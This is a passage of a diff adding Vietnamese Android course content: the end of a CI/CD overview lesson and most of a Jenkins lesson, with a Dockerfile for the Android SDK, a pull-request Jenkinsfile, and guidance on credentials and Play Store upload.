+      <th style="padding:8px 12px;text-align:left;">Dạy chính ở</th>
+      <th style="padding:8px 12px;text-align:left;">Bài khác chỉ nhắc</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Secret, keystore base64, <code>signingConfigs.release</code> đọc biến môi trường</td>
+      <td style="padding:8px 12px;">11.4</td>
+      <td style="padding:8px 12px;">11.1 Credentials, 11.2 Code Signing, 11.3 <code>encrypt-file</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">versionCode lấy từ số build của CI</td>
+      <td style="padding:8px 12px;">11.4 (<code>GITHUB_RUN_NUMBER</code>)</td>
+      <td style="padding:8px 12px;"><code>BUILD_NUMBER</code>, <code>BITRISE_BUILD_NUMBER</code>, <code>TRAVIS_BUILD_NUMBER</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Service account, track, staged rollout, promote, release notes</td>
+      <td style="padding:8px 12px;">11.4</td>
+      <td style="padding:8px 12px;">11.1, 11.2 dùng plugin hoặc Step của tool</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Tên task theo variant, matrix theo flavor</td>
+      <td style="padding:8px 12px;"><a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a></td>
+      <td style="padding:8px 12px;">11.4 nhắc matrix</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;">Ký app, Play App Signing; R8, <code>mapping.txt</code>, Firebase App Distribution</td>
+      <td style="padding:8px 12px;"><a href="../session_01/output_packages/apk_files.md" target="_blank" rel="noopener">APK</a>, <a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">AAB</a>; <a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a></td>
+      <td style="padding:8px 12px;">11.x dùng lại</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3>Thứ tự học đề xuất</h3>
+
+<div class="mermaid">
+flowchart LR
+    O["11.0 Overview"] --&gt; G["11.4 Github CI"]
+    G --&gt; J["11.1 Jenkins"]
+    G --&gt; B["11.2 Bitrise"]
+    G --&gt; T["11.3 Travis CI"]
+</div>
+
+<ol>
+  <li><strong>11.4 trước:</strong> bài chính, dạy khái niệm dùng chung và Publish Store.</li>
+  <li><strong>11.1, 11.2:</strong> tự host và SaaS chuyên mobile; đọc khi team dùng hoặc cân nhắc.</li>
+  <li><strong>11.3 cuối:</strong> bài ngắn, để đọc cấu hình cũ và migrate.</li>
+</ol>
+
+<h2>Ví dụ thực tế</h2>
+
+<p>Một bản sửa lỗi đi trọn pipeline, ở tool nào cũng vậy:</p>
+
+<ol>
+  <li><strong>PR check:</strong> PR sửa lỗi tính phí ship có test đỏ nên bị chặn; sửa xong, check xanh, merge.</li>
+  <li><strong>Bản cho QA:</strong> push lên <code>main</code> build variant <code>staging</code>, đẩy qua Firebase App Distribution.</li>
+  <li><strong>Release:</strong> push tag <code>v2.4.0</code>; pipeline ký AAB bằng keystore từ secret, versionCode từ số build, lưu AAB và <code>mapping.txt</code>, upload lên internal track.</li>
+  <li><strong>Promote:</strong> nhóm nội bộ thử xong, promote lên production với staged rollout 10%.</li>
+  <li><strong>Giám sát:</strong> chỉ số ổn định thì tăng dần lên 100%; crash tăng thì dừng rollout.</li>
+</ol>
+
+<h2>Sai lầm thường gặp</h2>
+
+<h3>1. Coi CI chỉ là "máy build hộ"</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> pipeline chỉ chạy <code>assembleDebug</code>; CI xanh nhưng lỗi vẫn lọt.</p>
+
+<p><strong>Cách sửa:</strong> PR check có kiểm tra tĩnh, unit test và build; đỏ thì <strong>chặn merge</strong> (11.4).</p>
+
+<h3>2. Nhầm Continuous Delivery với tự động lên production</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> mọi tag lên thẳng production 100%; bản lỗi tới toàn bộ người dùng.</p>
+
+<p><strong>Cách sửa:</strong> tự động tới internal track; lên production có người duyệt, dùng staged rollout.</p>
+
+<h3>3. Để bước phát hành phụ thuộc vào một máy cá nhân</h3>
+
+<p><strong>Lỗi lộ ra thế nào:</strong> keystore chỉ có trên laptop một người; người đó nghỉ là không phát hành được.</p>
+
+<p><strong>Cách sửa:</strong> keystore và khoá service account nằm trong secret của tool CI; bản release chỉ build trên CI từ tag.</p>
+
+<h2>Lịch sử phát triển</h2>
+
+<ul>
+  <li><strong>1991:</strong> Grady Booch dùng cụm từ "continuous integration"; cuối thập niên 1990, Extreme Programming đưa CI vào thực hành hằng ngày.</li>
+  <li><strong>2000:</strong> bài "Continuous Integration" của Martin Fowler phổ biến khái niệm; CruiseControl (2001) là một trong những CI server đầu tiên.</li>
+  <li><strong>2010:</strong> sách <em>Continuous Delivery</em> (Jez Humble, David Farley) định nghĩa deployment pipeline.</li>
+  <li><strong>2011:</strong> Hudson đổi tên thành Jenkins; Travis CI ra đời.</li>
+  <li><strong>2013:</strong> Google Play thêm alpha/beta testing và staged rollout.</li>
+  <li><strong>2014:</strong> Bitrise thành lập, CI/CD chuyên cho mobile.</li>
+  <li><strong>11/2019:</strong> GitHub Actions hỗ trợ CI/CD chính thức (GA).</li>
+  <li><strong>2021:</strong> <code>travis-ci.org</code> tắt; từ 08/2021 Google Play yêu cầu app mới dùng AAB.</li>
+</ul>
+
+<h2>Kết nối hệ thống</h2>
+
+<ul>
+  <li><strong>Tiên quyết:</strong>
+<ul>
+  <li><a href="../coding_analyst_and_testing/index.md" target="_blank" rel="noopener">Session 10 Overview</a>: bước "cổng trước khi merge" chính là PR check.</li>
+  <li><a href="../session_04/android_manifest/package_build_gradle/build_types.md" target="_blank" rel="noopener">Build Types</a>, <a href="../session_04/android_manifest/package_build_gradle/flavor.md" target="_blank" rel="noopener">Flavor</a>: variant, ký release, <code>mapping.txt</code>.</li>
+  <li><a href="../session_01/output_packages/aab_files.md" target="_blank" rel="noopener">Android App Bundle (AAB)</a>: Play App Signing, upload key.</li>
+</ul></li>
+  <li><strong>Trong session:</strong> <a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> (học trước), <a href="jenkins.md" target="_blank" rel="noopener">11.1 Jenkins</a>, <a href="bitrise.md" target="_blank" rel="noopener">11.2 Bitrise</a>, <a href="travis_ci.md" target="_blank" rel="noopener">11.3 Travis CI</a>.</li>
+</ul>
+
+<h2>Tham khảo</h2>
+
+<ul>
+  <li><a href="https://martinfowler.com/articles/continuousIntegration.html" target="_blank" rel="noopener">Continuous Integration - Martin Fowler</a></li>
+  <li><a href="https://martinfowler.com/bliki/ContinuousDelivery.html" target="_blank" rel="noopener">Continuous Delivery - Martin Fowler</a></li>
+  <li><a href="https://support.google.com/googleplay/android-developer/answer/9845334" target="_blank" rel="noopener">Set up and manage testing tracks (internal, closed, open) - Play Console Help</a></li>
+  <li><a href="https://support.google.com/googleplay/android-developer/answer/6346149" target="_blank" rel="noopener">Release app updates with staged rollouts - Play Console Help</a></li>
+  <li><a href="https://www.jenkins.io/doc/book/pipeline/" target="_blank" rel="noopener">Jenkins Pipeline - Jenkins User Documentation</a></li>
+  <li><a href="https://docs.bitrise.io/" target="_blank" rel="noopener">Bitrise Docs</a></li>
+  <li><a href="https://docs.travis-ci.com/user/languages/android/" target="_blank" rel="noopener">Build an Android Project - Travis CI Docs</a></li>
+  <li><a href="https://docs.github.com/en/actions" target="_blank" rel="noopener">GitHub Actions documentation - GitHub Docs</a></li>
+</ul>
+    `
+  },
+
+  'jenkins': {
+    title: 'Jenkins',
+    summary: 'Jenkins là automation server mã nguồn mở, tự host, trong đó controller nhận sự kiện, lên lịch và lưu kết quả, còn agent thực thi pipeline viết trong Jenkinsfile; mọi khả năng ngoài lõi đến từ plugin. Bài viết hai pipeline chuẩn bằng Jenkinsfile trên agent có Android SDK, dùng Credentials để ký AAB và upload lên Play internal track.',
+    status: 'published',
+    difficulty: 'intermediate',
+    estimatedReadingTime: '14 phút',
+    depth: 'standard',
+    tags: ['android', 'session-11', 'cicd', 'jenkins', 'jenkinsfile', 'declarative-pipeline', 'self-hosted'],
+    domain: 'Android',
+    module: 'Session 11',
+    prerequisites: ['android.cicd.overview', 'android.cicd.github_ci', 'android.manifest.build_types', 'android.output_packages.aab_files'],
+    related: ['android.cicd.bitrise', 'android.cicd.travis_ci', 'android.testing.lint', 'android.testing.unit_testing', 'android.manifest.product_flavors', 'android.testing.fit_bug_optimization'],
+    learningOutcomes: [
+      'Giải thích được kiến trúc controller, agent và plugin của Jenkins, và vì sao không chạy build trên built-in node.',
+      'Triển khai được Multibranch Pipeline nhận webhook từ GitHub hoặc GitLab để build mỗi Pull Request và báo trạng thái về đó.',
+      'Triển khai được Declarative Pipeline trong Jenkinsfile chạy trên agent có Android SDK, với agent, environment, options, stages, when, parallel và post.',
+      'Áp dụng được Jenkins Credentials với withCredentials để ký AAB và upload lên Play internal track mà không lộ secret.',
+      'Biết khi nào nên chọn Jenkins thay cho CI dạng SaaS và cái giá vận hành phải trả.'
+    ],
+    knowledgeGap: 'Nhiều team "có Jenkins" nhưng chỉ có một job bấm tay chạy trên controller, cấu hình nằm trong giao diện web, keystore nằm trong thư mục home của máy build. Hệ quả: build không tái lập được, PR đỏ vẫn merge, ai sửa được job là đọc được keystore, versionCode trùng khiến Play từ chối bản upload.',
+    updatedAt: '2026-11-10',
+    readTime: '14 phút',
+    content: `
+<h2>Vấn đề cần giải quyết</h2>
+
+<p><a href="github_ci.md" target="_blank" rel="noopener">11.4 Github CI</a> chạy hai pipeline chuẩn trên máy build GitHub cho thuê. Cách đó bị loại khi mã nguồn và keystore <strong>không được rời mạng công ty</strong>, repo trên GitLab tự host hay Bitbucket Data Center, cần <strong>phần cứng riêng</strong> (KVM chạy emulator, thiết bị thật), hoặc công ty <strong>đã có Jenkins</strong>.</p>
+
+<p>Khi đó cần CI <strong>tự host</strong>, và việc SaaS lo sẵn thành việc của bạn: máy build có Android SDK, chỗ cất secret, ai đọc được nó. Khái niệm pipeline, secret, track của Play ở <a href="index.md" target="_blank" rel="noopener">11.0</a> và <a href="github_ci.md" target="_blank" rel="noopener">11.4</a>; bài này chỉ dạy phần riêng của Jenkins.</p>
+
+<h2>Sau khi học xong</h2>
+
+<ul>
+  <li>Giải thích được kiến trúc controller, agent và plugin của Jenkins, và vì sao không chạy build trên built-in node.</li>
+  <li>Triển khai được Multibranch Pipeline nhận webhook từ GitHub hoặc GitLab để build mỗi Pull Request và báo trạng thái về đó.</li>
+  <li>Triển khai được Declarative Pipeline trong Jenkinsfile chạy trên agent có Android SDK, với agent, environment, options, stages, when, parallel và post.</li>
+  <li>Áp dụng được Jenkins Credentials với withCredentials để ký AAB và upload lên Play internal track mà không lộ secret.</li>
+  <li>Biết khi nào nên chọn Jenkins thay cho CI dạng SaaS và cái giá vận hành phải trả.</li>
+</ul>
+
+<h2>Jenkins là gì?</h2>
+
+<p><strong>Jenkins</strong> là một <strong>automation server (máy chủ tự động hoá)</strong> mã nguồn mở, <strong>tự host</strong>: một <strong>controller</strong> nhận sự kiện, lên lịch build và lưu kết quả, còn các <strong>agent</strong> thực thi pipeline viết bằng code trong <code>Jenkinsfile</code> nằm cùng repo; mọi khả năng ngoài phần lõi (Git, Docker, credentials, báo trạng thái lên GitHub) đến từ <strong>plugin</strong>.</p>
+
+<p>Mental model: Jenkins là <strong>một xưởng build do bạn tự xây</strong>. Controller là <strong>phòng điều phối</strong> nhận đơn (webhook, lịch), phát phiếu, giữ sổ sách (log, artifact, kết quả test); agent là <strong>máy trong xưởng</strong> làm theo phiếu <code>Jenkinsfile</code>; plugin là <strong>đồ nghề lắp thêm</strong>, cũng phải bảo trì.</p>
+
+<h2>Cách hoạt động</h2>
+
+<h3>Controller, agent và plugin</h3>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Thành phần</th>
+      <th style="padding:8px 12px;text-align:left;">Vai trò</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Controller</strong></td>
+      <td style="padding:8px 12px;">Giao diện web, cấu hình job, hàng đợi, log, artifact, credentials; không cần Android SDK</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Agent</strong></td>
+      <td style="padding:8px 12px;">Máy thực thi build, có <strong>executor</strong> (khe chạy song song) và <strong>label</strong> để pipeline chọn; cần JDK, Android SDK hoặc Docker</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Built-in node</strong></td>
+      <td style="padding:8px 12px;">Executor nằm ngay trên controller, không dùng để build</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><strong>Plugin</strong></td>
+      <td style="padding:8px 12px;">Pipeline, Git, GitHub Branch Source, Docker Pipeline, Credentials Binding, JUnit...; phải tương thích với version Jenkins</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Java 17 dừng ở weekly 2.544 và LTS 2.541.3; bản sau cần <strong>Java 21 hoặc 25</strong> cho cả controller lẫn agent. Đó là JDK <strong>chạy Jenkins</strong>; JDK <strong>chạy Gradle</strong> vẫn có thể là JDK 17 trong image build.</p>
+
+<div class="callout callout-warn"><span class="callout-icon">⚠️</span><div class="callout-body">Build trên built-in node đọc được mọi file của tiến trình Jenkins, kể cả credentials của toàn hệ thống. Tài liệu Jenkins khuyên đặt executor của built-in node về <strong>0</strong> (Manage Jenkins &gt; Nodes &gt; Built-In Node), chỉ build trên agent.</div></div>
+
+<p>Agent cố định giữ cache nhưng tích tụ trạng thái; agent <strong>dùng xong bỏ</strong> (plugin Kubernetes, EC2) hoặc <strong>container mới</strong> mỗi build cho môi trường sạch, như bài này dùng.</p>
+
+<h3>Multibranch Pipeline và webhook</h3>
+
+<p><strong>Multibranch Pipeline</strong> là một thư mục job: Jenkins quét repo qua một <strong>branch source</strong> (plugin GitHub Branch Source, GitLab Branch Source, Bitbucket Branch Source) và tự tạo <strong>một job con cho mỗi nhánh, mỗi Pull Request, và mỗi tag nếu bật</strong> có <code>Jenkinsfile</code>. Job con của PR tên dạng <code>PR-42</code>; build có sẵn biến <code>BRANCH_NAME</code>, <code>CHANGE_ID</code> (số PR), <code>CHANGE_TARGET</code> (nhánh đích), <code>TAG_NAME</code>.</p>
+
+<p>Luồng một PR được kiểm tra:</p>
+
+<ol>
+  <li>Developer push commit vào PR 42.</li>
+  <li>GitHub gửi <strong>webhook</strong> tới <code>/github-webhook/</code> của Jenkins (GitLab gửi tới endpoint của plugin GitLab).</li>
+  <li>Branch source cập nhật job con <code>PR-42</code>, xếp build vào hàng đợi.</li>
+  <li>Controller giao build cho agent có label phù hợp.</li>
+  <li>Agent checkout (mặc định là kết quả merge PR vào nhánh đích), chạy <code>Jenkinsfile</code>.</li>
+  <li>Controller báo commit status về PR, mặc định tên <code>continuous-integration/jenkins/pr-merge</code>; đặt nó làm required status check để chặn Merge khi đỏ (<a href="github_ci.md" target="_blank" rel="noopener">11.4</a>).</li>
+</ol>
+
+<div class="mermaid">
+sequenceDiagram
+    actor Dev as Developer
+    participant GH as GitHub
+    participant C as Jenkins controller
+    participant A as Agent linux-docker
+    Dev-&gt;&gt;GH: (1) push commit vào PR 42
+    GH-&gt;&gt;C: (2) webhook pull_request
+    C-&gt;&gt;C: (3) cập nhật job con PR-42, xếp hàng
+    C-&gt;&gt;A: (4) giao build
+    A-&gt;&gt;A: (5) checkout, chạy Jenkinsfile
+    A--&gt;&gt;C: log, report, kết quả
+    C--&gt;&gt;GH: (6) commit status success hoặc failure
+</div>
+
+<p>Ba điểm riêng của Jenkins:</p>
+
+<ul>
+  <li><strong>Webhook phải tới được controller.</strong> Jenkins trong mạng nội bộ thì GitHub.com không gọi vào được: dùng Git server cùng mạng, webhook relay, hoặc quét định kỳ.</li>
+  <li><strong>Tag được phát hiện nhưng không tự build.</strong> Cần build strategy cho tag (plugin Basic Branch Build Strategies); thêm strategy là thay mặc định "build mọi thứ trừ tag", nên khai báo lại cho nhánh và PR.</li>
+  <li><strong>PR từ fork là code không tin cậy.</strong> Trust policy của GitHub Branch Source cho PR của người không đủ quyền chạy <code>Jenkinsfile</code> của nhánh đích; đừng nới nó. Credential gọi GitHub API nên là <strong>GitHub App</strong> thay vì token cá nhân.</li>
+</ul>
+
+<h3>Agent có Android SDK</h3>
+
+<p>Gradle cần JDK, Android SDK (tìm qua <code>ANDROID_HOME</code>; <code>ANDROID_SDK_ROOT</code> đã deprecated) và <strong>license của các gói SDK đã được chấp nhận</strong> (<code>sdkmanager --licenses</code> trên máy không giao diện). SDK có thể <strong>cài sẵn trên agent</strong> (đặt <code>ANDROID_HOME</code> trong cấu hình node, hợp với máy cắm thiết bị, chạy emulator), hoặc nằm trong <strong>Docker agent</strong> <code>agent { dockerfile { ... } }</code> (plugin Docker Pipeline) để version SDK được review cùng code.</p>
+
+<h4>Ví dụ: image build chứa JDK 17 và Android SDK</h4>
+
+<p><strong>Bài toán:</strong> mọi build dùng cùng JDK 17 và <code>compileSdk</code>, bất kể agent nào nhận việc; đổi <code>compileSdk</code> thì sửa Dockerfile trong cùng PR.</p>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="dockerfile"><code># ci/android-sdk.Dockerfile
+FROM eclipse-temurin:17-jdk
+
+ENV ANDROID_HOME=/opt/android-sdk
+ENV PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools
+
+# Tên file ở mục "Command line tools only" trên developer.android.com/studio; ghim cố định để build tái lập
+ARG CMDLINE_TOOLS_ZIP=commandlinetools-linux-15859902_latest.zip
+
+RUN apt-get update &amp;&amp; apt-get install -y --no-install-recommends git unzip curl \\
+    &amp;&amp; rm -rf /var/lib/apt/lists/* \\
+    &amp;&amp; mkdir -p $ANDROID_HOME/cmdline-tools \\
+    &amp;&amp; curl -fsSL -o /tmp/tools.zip https://dl.google.com/android/repository/$CMDLINE_TOOLS_ZIP \\
+    &amp;&amp; unzip -q /tmp/tools.zip -d /tmp/tools \\
+    &amp;&amp; mv /tmp/tools/cmdline-tools $ANDROID_HOME/cmdline-tools/latest \\
+    &amp;&amp; rm -rf /tmp/tools /tmp/tools.zip
+
+# Chấp nhận license lúc dựng image, rồi cài đúng gói app cần
+RUN yes | sdkmanager --licenses &gt; /dev/null \\
+    &amp;&amp; sdkmanager "platform-tools" "platforms;android-36" "build-tools;36.0.0" \\
+    &amp;&amp; chmod -R a+rwX $ANDROID_HOME</code></pre>
+
+<p><code>chmod</code> cần vì Jenkins chạy container bằng user id của agent, không phải root.</p>
+
+<div class="callout callout-note"><span class="callout-icon">ℹ️</span><div class="callout-body">Trang <code>sdkmanager</code> trên developer.android.com hiện ghi công cụ này deprecated, thay bằng <code>android sdk install</code> của Android CLI (vd <code>android sdk install platforms/android-36</code>). Tài liệu Android CLI chưa nói cách chấp nhận license trên CI, nên image vẫn dùng <code>sdkmanager --licenses</code>.</div></div>
+
+<p><strong>Kết quả:</strong> <code>docker build -f ci/android-sdk.Dockerfile .</code> thành công; <code>sdkmanager --list_installed</code> trong container liệt kê đúng ba gói.</p>
+
+<h3>Declarative Pipeline trong Jenkinsfile</h3>
+
+<p>Jenkins có hai cú pháp: <strong>Scripted</strong> (Groovy tự do trong <code>node {}</code>) và <strong>Declarative</strong> (cấu trúc cố định, kiểm tra trước khi chạy, nên dùng; cần Groovy thì bọc trong <code>script {}</code>). Các khối chính:</p>
+
+<table style="width:100%;border-collapse:collapse;font-size:14px;margin-bottom:1em;">
+  <thead>
+    <tr style="border-bottom:2px solid #30363d;background:var(--bg-card,#161b22);">
+      <th style="padding:8px 12px;text-align:left;">Khối</th>
+      <th style="padding:8px 12px;text-align:left;">Ý nghĩa</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>agent</code></td>
+      <td style="padding:8px 12px;">Chạy ở đâu: <code>any</code>, <code>none</code>, <code>label '...'</code>, <code>docker { image '...' }</code>, <code>dockerfile { filename '...' }</code>; đặt ở gốc hoặc từng <code>stage</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>environment</code></td>
+      <td style="padding:8px 12px;">Biến môi trường cho pipeline hoặc stage; <code>credentials('id')</code> lấy secret</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>options</code></td>
+      <td style="padding:8px 12px;"><code>timeout(time:, unit:)</code>, <code>disableConcurrentBuilds(abortPrevious: true)</code>, <code>buildDiscarder(logRotator(...))</code></td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>stages</code> / <code>stage</code> / <code>steps</code></td>
+      <td style="padding:8px 12px;">Các bước; mỗi <code>stage</code> là một cột trong giao diện</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>when</code></td>
+      <td style="padding:8px 12px;">Điều kiện chạy stage: <code>branch 'main'</code>, <code>changeRequest()</code>, <code>buildingTag()</code>, <code>tag pattern: 'v*', comparator: 'GLOB'</code>, <code>expression { ... }</code>; <code>beforeAgent true</code> xét điều kiện trước khi cấp agent</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>parallel</code></td>
+      <td style="padding:8px 12px;">Các stage con chạy song song, mỗi stage có thể có agent riêng</td>
+    </tr>
+    <tr style="border-bottom:1px solid #21262d;">
+      <td style="padding:8px 12px;font-weight:600;"><code>post</code></td>
+      <td style="padding:8px 12px;">Chạy theo kết quả: <code>always</code>, <code>success</code>, <code>failure</code>, <code>unstable</code>, <code>cleanup</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Step hay dùng: <code>sh</code>, <code>junit</code> (đọc report XML của test), <code>archiveArtifacts</code> (lưu file lên controller), <code>recordIssues</code> với <code>androidLintParser</code> (plugin Warnings Next Generation, hiện issue của Android Lint).</p>
+
+<h4>Ví dụ: kiểm tra mỗi Pull Request</h4>
+
+<p><strong>Bài toán:</strong> pipeline PR check chuẩn: mỗi PR vào <code>main</code> qua lint, unit test, build debug; lưu report và APK; chặn merge khi đỏ. Job Multibranch Pipeline <code>android-app-pr</code> discover nhánh và PR.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
+  <li>Agent label <code>linux-docker</code> dựng image, chạy build trong container có gắn thư mục cache của agent.</li>
+  <li><code>GRADLE_USER_HOME</code> trỏ vào cache đó, build sau không tải lại dependency.</li>
+  <li><code>options</code> giới hạn 30 phút, huỷ build cũ của cùng PR khi có commit mới.</li>
+  <li>Một lệnh Gradle chạy <code>lintDebug testDebugUnitTest assembleDebug</code> (<a href="../coding_analyst_and_testing/lint.md" target="_blank" rel="noopener">10.3</a>, <a href="../coding_analyst_and_testing/unit_testing.md" target="_blank" rel="noopener">10.2</a>).</li>
+  <li><code>post { always }</code> ghi kết quả test và lint <strong>cả khi đỏ</strong>.</li>
+  <li><code>post { success }</code> lưu APK debug.</li>
+</ol>
+
+<div class="mermaid">
+flowchart TD
+    A["(1) Dựng image, chạy container trên agent linux-docker"] --&gt; B["(2) GRADLE_USER_HOME trỏ vào cache"]
+    B --&gt; C["(3) options: timeout, huỷ build cũ"]
+    C --&gt; D["(4) ./gradlew lintDebug testDebugUnitTest assembleDebug"]
+    D --&gt; E["(5) post always: junit, recordIssues, lưu report"]
+    E --&gt; F{"Thành công?"}
+    F --&gt;|"Có"| G["(6) post success: lưu APK debug"]
+    F --&gt;|"Không"| H["PR hiện failure, chặn merge"]
+</div>
+
+<p><strong>Code:</strong></p>
+
+<pre data-lang="groovy"><code>// Jenkinsfile (job android-app-pr)
+pipeline {
+    agent {
+        dockerfile {                                            // (1)
+            filename 'ci/android-sdk.Dockerfile'
+            label 'linux-docker'
+            args '-v $HOME/.gradle-ci:/gradle-cache'
+        }
+    }
+    environment {
+        GRADLE_USER_HOME = '/gradle-cache'                      // (2)
+    }
+    options {
+        timeout(time: 30, unit: 'MINUTES')                      // (3)
+        disableConcurrentBuilds(abortPrevious: true)
+        buildDiscarder(logRotator(numToKeepStr: '30'))
+    }
+    stages {
+        stage('Lint, test, build') {
+            steps {
+                sh './gradlew lintDebug testDebugUnitTest assembleDebug'   // (4)
+            }
+        }
+    }
+    post {
+        always {                                                // (5)
+            junit testResults: '**/build/test-results/testDebugUnitTest/*.xml', allowEmptyResults: true
+            recordIssues tools: [androidLintParser(pattern: '**/build/reports/lint-results-debug.xml')]
+            archiveArtifacts artifacts: '**/build/reports/lint-results-debug.html', allowEmptyArchive: true
+        }
+        success {
+            archiveArtifacts artifacts: 'app/build/outputs/apk/debug/*.apk', fingerprint: true   // (6)
+        }
+    }
+}</code></pre>
+
+<p>Declarative Pipeline tự <code>checkout scm</code> khi vào agent. Tạo trước <code>$HOME/.gradle-ci</code> trên agent; để Docker tự tạo thì nó thuộc <code>root</code>, Gradle trong container không ghi được.</p>
+
+<p><strong>Kết quả:</strong> PR có unit test hỏng → check <code>continuous-integration/jenkins/pr-merge</code> failure; build <code>PR-42</code> có tab Tests chỉ đúng test hỏng, mục lint liệt kê issue. Push bản sửa → build cũ bị huỷ, build mới xanh, có APK debug trong Build Artifacts.</p>
+
+<h4><code>parallel</code>: chỉ khi các nhánh chạy trên agent khác nhau</h4>
+
+<p>Hai lệnh <code>./gradlew</code> song song trong <strong>cùng workspace</strong> tranh nhau thư mục <code>build/</code>, mà Gradle đã tự chạy song song task độc lập. <code>parallel</code> chỉ có ích khi mỗi nhánh có agent riêng:</p>
+
+<pre data-lang="groovy"><code>// Jenkinsfile: stage thay cho stage 'Lint, test, build'
+stage('Test') {
+    parallel {
+        stage('Unit test') {
+            steps { sh './gradlew testDebugUnitTest' }
+        }
+        stage('Instrumented test') {
+            agent { label 'android-emulator' }    // máy có SDK, emulator, KVM (task ở 10.2)
+            environment {
+                GRADLE_USER_HOME = '/var/cache/gradle'   // máy này không có /gradle-cache của container
+            }
+            steps { sh './gradlew connectedDebugAndroidTest' }
+        }
+    }
+}</code></pre>
+
+<h3>Credentials và <code>withCredentials</code></h3>
+
+<p><strong>Credentials</strong> là kho secret mã hoá trên controller. Mỗi credential có <strong>id</strong> và <strong>phạm vi</strong>: <strong>Global</strong> cho mọi job; trong một <strong>folder</strong> (Multibranch Pipeline cũng là folder) thì chỉ job trong folder đó. Android dùng hai loại: <strong>Secret file</strong> (keystore <code>.jks</code>, JSON của service account Play; pipeline nhận <strong>đường dẫn file tạm</strong>, bị xoá khi hết khối) và <strong>Secret text</strong> (mật khẩu keystore, key alias, mật khẩu key).</p>
+
+<p>Secret file giữ được file nhị phân nên <strong>không cần base64</strong> như 11.4: upload thẳng <code>release.jks</code>, credential này thay <code>RELEASE_KEYSTORE_BASE64</code>. <code>withCredentials([file(credentialsId: '...', variable: '...'), string(...)]) { ... }</code> (plugin Credentials Binding) gắn secret thành biến môi trường <strong>chỉ trong khối của nó</strong> (code ở Ví dụ thực tế).</p>
+
+<p>Lệnh <code>sh</code> dùng secret phải viết bằng <strong>nháy đơn</strong> để shell đọc biến, không để Groovy chèn giá trị (Sai lầm 2). <strong>Masking chỉ là lớp cuối</strong>: Jenkins thay secret nguyên văn trong log bằng <code>****</code>, nhưng <code>base64</code> là qua mặt; tài liệu Jenkins coi ai sửa được job (hay Jenkinsfile của nó) là người được tin với secret của job. Vì vậy credential release <strong>đặt trong folder của job release</strong>, không Global (Sai lầm 4).</p>
+
+<h3>Upload lên Play</h3>
+
+<p>Service account, quyền trên Play Console, track, staged rollout: xem <a href="github_ci.md" target="_blank" rel="noopener">11.4</a>. Bài dùng cách chính của 11.4: task <strong>Gradle Play Publisher</strong> <code>./gradlew publishReleaseBundle</code>, khoá JSON qua biến <code>ANDROID_PUBLISHER_CREDENTIALS</code>; Jenkins chỉ đổi chỗ lấy secret.</p>
+
+<p>Cách thứ hai là plugin <strong>Google Play Android Publisher</strong> (step <code>androidApkUpload</code>, tham số <code>googleCredentialsId</code>, <code>filesPattern</code>, <code>trackName</code>), nhưng bản mới nhất 4.2 ra từ 08/2021; dùng thì thử tương thích trước. Gradle Play Publisher cũng ở chế độ bảo trì, nhưng là một phần của build, chạy như nhau trên mọi CI.</p>
+
+<p>App phải <strong>đã tồn tại</strong> trên Play Console. Mỗi tài khoản chỉ mở được một edit của Play API mỗi lúc (edit mới làm edit cũ mất hiệu lực): đừng để hai job upload cùng app chạy song song.</p>
+
+<h2>Ví dụ thực tế</h2>
+
+<h3>Pipeline Release: tag <code>v*</code> thành bản trên Play internal track</h3>
+
+<p><strong>Bài toán:</strong> pipeline Release chuẩn: push tag <code>v1.4.0</code> → AAB đã ký, lưu AAB và <code>mapping.txt</code>, upload lên internal track. Job Multibranch <code>android-app-release</code> chỉ discover tag, có build strategy cho tag, Script Path <code>Jenkinsfile.release</code>, giữ credential release trong folder của nó.</p>
+
+<p><strong>Luồng chạy:</strong></p>
+
+<ol>
